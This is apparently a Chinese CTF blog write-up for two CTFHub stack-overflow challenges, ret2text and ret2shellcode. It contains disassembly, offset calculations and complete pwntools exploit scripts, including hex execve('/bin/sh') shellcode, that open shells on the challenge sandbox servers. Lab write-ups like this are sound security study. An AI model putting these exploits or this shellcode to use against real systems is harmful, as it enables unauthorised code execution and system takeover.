---
title: CTFHub PWN刷题
date: 2020-07-09 17:17:40
tags: PWN
categories:
 - CTF
---

# CTFHub PWN刷题

最近在CTFHub的PWN技能树中找了两道题来学习栈溢出——ret2text和ret2shellcode

这两道题出的还是很基础的，吃透栈溢出的基本概念就可以将题目解出。

<!-- more -->

## ret2text writeup

先用checsec检查一下文件的保护类型

```markdown
Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

可以看出没有采取任何的栈保护

再用IDA打开文件，看到函数中有system函数，搜素字符串发现secure函数中出现了`system("/bin/sh")`，再看主函数的伪代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-70h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts("Welcome to CTFHub ret2text.Input someting:");
  gets(&v4, 0LL);
  puts("bye");
  return 0;
}
```

可以看到`gets函数`存在明显的溢出漏洞，所以利用`gets函数`，输入足够长的字符串，达到溢出栈的目的。查看变量的位置，为 `[rbp-0x70]`。由于是64位系统，要覆盖掉ebp，就要+8字节。因此 字符串长度为  `0x70 + 8`

再用反汇编查看secure函数的代码，确定system("/bin/sh")的地址为`0x00000000004007b8`，即`0x4007b8`

```assembly
   0x0000000000400777 <+0>:	push   rbp
   0x0000000000400778 <+1>:	mov    rbp,rsp
   0x000000000040077b <+4>:	sub    rsp,0x10
   0x000000000040077f <+8>:	mov    edi,0x0
   0x0000000000400784 <+13>:	call   0x400640 <time@plt>
   0x0000000000400789 <+18>:	mov    edi,eax
   0x000000000040078b <+20>:	call   0x400630 <srand@plt>
   0x0000000000400790 <+25>:	call   0x400680 <rand@plt>
   0x0000000000400795 <+30>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400798 <+33>:	lea    rax,[rbp-0x8]
   0x000000000040079c <+37>:	mov    rsi,rax
   0x000000000040079f <+40>:	lea    rdi,[rip+0x122]        # 0x4008c8
   0x00000000004007a6 <+47>:	mov    eax,0x0
   0x00000000004007ab <+52>:	call   0x400670 <__isoc99_scanf@plt>
   0x00000000004007b0 <+57>:	mov    eax,DWORD PTR [rbp-0x8]
   0x00000000004007b3 <+60>:	cmp    DWORD PTR [rbp-0x4],eax
   0x00000000004007b6 <+63>:	jne    0x4007c4 <secure+77>
   0x00000000004007b8 <+65>:	lea    rdi,[rip+0x10c]       ; "/bin/sh"
   0x00000000004007bf <+72>:	call   0x400620 <system@plt>
   0x00000000004007c4 <+77>:	nop
   0x00000000004007c5 <+78>:	leave  
   0x00000000004007c6 <+79>:	ret
```

得到以上两个值之后就可以写exp了

```python
from pwn import *

host = 'challenge-6d9543332f6f24b5.sandbox.ctfhub.com'
port = 33698

#p = process("./pwn")
p = connect(host, port)
payload = 'A' * 0x78 + p64(0x4007b8)
p.sendline(payload)
p.interactive()
```

之后就能拿到flag了

## ret2shellcode writeup

使用checksec查看一下文件的保护

```markdown
Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

依旧没有采取任何的保护，再用IDA打开，查看文件的代码。

因为函数中不包含system函数，用file查看文件时也显示使用动态链接，然而题中并未提供动态链接库，因此ret2libc的思路是行不通的，也无法使用ROP。因此采用ret2shellcode的功能

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+0h] [rbp-10h]
  __int64 v5; // [rsp+8h] [rbp-8h]

  buf = 0LL;
  v5 = 0LL;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  puts("Welcome to CTFHub ret2shellcode!");
  printf("What is it : [%p] ?\n", &buf, 0LL, 0LL);
  puts("Input someting : ");
  read(0, &buf, 0x400uLL);
  return 0;
}
```

在伪代码  `printf("What is it : [%p] ?\n", &buf, 0LL, 0LL);`中可以看到`printf函数`会把变量`buf`的地址输出，因此可以直接读取`buf`的地址。

 `__int64 buf; // [rsp+0h] [rbp-10h]`可以得出`buf`对`rbp`的偏移量为`0x10`，因此我们需要溢出的空间为`16 + 8 = 24`，而偏移地址为`buf_addr+32`(32 = 24 + 8)。

最后生成shellcode，shellcode可以使用pwntools中函数生成

```python
from pwn import *
shellcode=asm(shellcraft.sh())
```

也可以直接使用

```bash
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```

两个测试过都可以pwn通，根据喜好选择。

之后就能构造payload

```bash
'a'*24+[buf_addr+32]+shellcode
```

然后编写完整的EXP

```python
from pwn import *

host = 'challenge-73515f640e7d1aa5.sandbox.ctfhub.com'
port = 36434

#p = process('./ret2shellcode')
p = connect(host,port)
p.recvuntil('[')
buf_addr = p.recvuntil(']', drop=True) # 获取buf地址
# print buf_addr
p.recvuntil('Input someting : ') # 执行直到出现这句话
shell="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.sendline('a'*24 + p64(int(buf_addr,16)+32) + shell)
p.interactive()
```

最后得到flag